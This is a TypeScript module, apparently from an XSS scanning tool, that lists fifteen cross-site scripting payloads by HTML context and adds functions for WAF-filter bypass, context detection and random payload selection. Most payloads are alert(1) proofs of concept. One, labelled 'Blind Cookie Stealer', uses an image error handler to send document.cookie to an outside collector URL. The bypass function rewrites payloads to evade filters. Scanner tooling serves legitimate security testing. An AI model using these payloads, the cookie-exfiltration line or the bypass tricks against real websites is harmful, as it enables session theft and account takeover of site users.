
import { HTMLContext, Payload } from "@/types/scanner";

// Default XSS payloads organized by HTML context
export const getDefaultPayloads = (): Payload[] => [
  {
    id: '1',
    value: '<script>alert(1)</script>',
    name: 'Basic Script Alert',
    category: 'basic',
    description: 'Basic script tag with alert function',
    context: ['html']
  },
  {
    id: '2',
    value: '"><script>alert(1)</script>',
    name: 'Quote Breaking Script',
    category: 'basic',
    description: 'Script tag that breaks out of attributes',
    context: ['attribute']
  },
  {
    id: '3',
    value: '</script><script>alert(1)</script>',
    name: 'Script Close Injection',
    category: 'basic',
    description: 'Closes any open script tag and injects a new one',
    context: ['script']
  },
  {
    id: '4',
    value: '"; alert(1); //',
    name: 'Script Injection',
    category: 'basic',
    description: 'JavaScript code injection within script context',
    context: ['script']
  },
  {
    id: '5',
    value: '<img src=x onerror=alert(1)>',
    name: 'Image Error Event',
    category: 'basic',
    description: 'Uses image error event to execute JavaScript',
    context: ['html']
  },
  {
    id: '6',
    value: '" onmouseover="alert(1)',
    name: 'Mouseover Event',
    category: 'basic',
    description: 'Injects an onmouseover event handler',
    context: ['attribute']
  },
  {
    id: '7',
    value: '<svg/onload=alert(1)>',
    name: 'SVG Onload Event',
    category: 'advanced',
    description: 'Uses SVG onload event to execute JavaScript',
    context: ['html']
  },
  {
    id: '8',
    value: 'javascript:alert(1)',
    name: 'JavaScript Protocol',
    category: 'basic',
    description: 'Uses JavaScript protocol in a URL context',
    context: ['url']
  },
  {
    id: '9',
    value: '--><script>alert(1)</script>',
    name: 'Comment Break',
    category: 'basic',
    description: 'Breaks out of HTML comment and executes script',
    context: ['comment']
  },
  {
    id: '10',
    value: '<ScRiPt>alert(1)</ScRiPt>',
    name: 'Case Variation',
    category: 'waf-bypass',
    description: 'Script tag with mixed case to bypass filters',
    context: ['html']
  },
  {
    id: '11',
    value: '<img src=`x` onerror=javascript:alert(1)>',
    name: 'Backtick Injection',
    category: 'waf-bypass',
    description: 'Uses backticks to bypass some WAF rules',
    context: ['html', 'attribute']
  },
  {
    id: '12',
    value: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    name: 'SVG Animation',
    category: 'advanced',
    description: 'SVG animation element with onbegin event',
    context: ['html']
  },
  {
    id: '13',
    value: '<body onload=alert(1)>',
    name: 'Body Onload',
    category: 'basic',
    description: 'Body tag with onload event',
    context: ['html']
  },
  {
    id: '14',
    value: '<iframe src="javascript:alert(1)"></iframe>',
    name: 'iFrame Injection',
    category: 'advanced',
    description: 'iFrame with JavaScript source URL',
    context: ['html']
  },
  {
    id: '15',
    value: '<img src=x onerror="fetch(\'https://example.com/collector\'+document.cookie)">',
    name: 'Blind Cookie Stealer',
    category: 'blind',
    description: 'Sends cookies to a collector URL',
    context: ['html']
  }
];

// Get payloads filtered by context
export const getPayloadsByContext = (context: HTMLContext): Payload[] => {
  const allPayloads = getDefaultPayloads();
  return allPayloads.filter(payload => payload.context.includes(context));
};

// Apply WAF bypass techniques to a payload (basic implementation)
export const applyWafBypass = (payload: string): string[] => {
  const bypasses = [
    payload, // Original
    payload.replace(/<script>/gi, '<ScRiPt>').replace(/<\/script>/gi, '</ScRiPt>'), // Case variation
    payload.replace(/<script>/gi, '<script/x>'), // Attribute break
    payload.replace(/alert\(1\)/gi, 'alert`1`'), // Template literals
    payload.replace(/alert\(1\)/gi, 'prompt(1)'), // Function variation
    payload.replace(/alert\(1\)/gi, 'confirm(1)'), // Function variation
    payload.replace(/alert\(1\)/gi, 'eval("ale"+"rt(1)")'), // String concatenation
    payload.replace(/<script>/gi, '<script src="data:,alert(1)">'), // Data protocol
  ];
  
  return [...new Set(bypasses)]; // Remove duplicates
};

// Detect most likely HTML context for an injection point (simplified)
export const detectContext = (html: string, injectionPoint: string): HTMLContext => {
  const injectionIndex = html.indexOf(injectionPoint);
  
  if (injectionIndex === -1) return 'html'; // Default
  
  // Get a substring before and after the injection point
  const before = html.substring(Math.max(0, injectionIndex - 100), injectionIndex);
  const after = html.substring(injectionIndex + injectionPoint.length, 
                              Math.min(html.length, injectionIndex + injectionPoint.length + 100));
  
  // Check contexts in order of specificity
  if (/<script[^>]*>[^<]*$/.test(before) || /^[^<]*<\/script>/i.test(after)) {
    return 'script';
  }
  
  if (/<style[^>]*>[^<]*$/.test(before) || /^[^<]*<\/style>/i.test(after)) {
    return 'style';
  }
  
  if (/<!--[^<]*$/.test(before) || /^[^<]*-->/i.test(after)) {
    return 'comment';
  }
  
  if (/\s(src|href|action)=['"][^'"]*$/.test(before)) {
    return 'url';
  }
  
  if (/\s\w+=['"][^'"]*$/.test(before) || /^[^'"]*['"]/.test(after)) {
    return 'attribute';
  }
  
  return 'html';
};

// Generate a random XSS payload for demonstration purposes
export const generateRandomPayload = (): Payload => {
  const payloads = getDefaultPayloads();
  const randomIndex = Math.floor(Math.random() * payloads.length);
  return payloads[randomIndex];
};
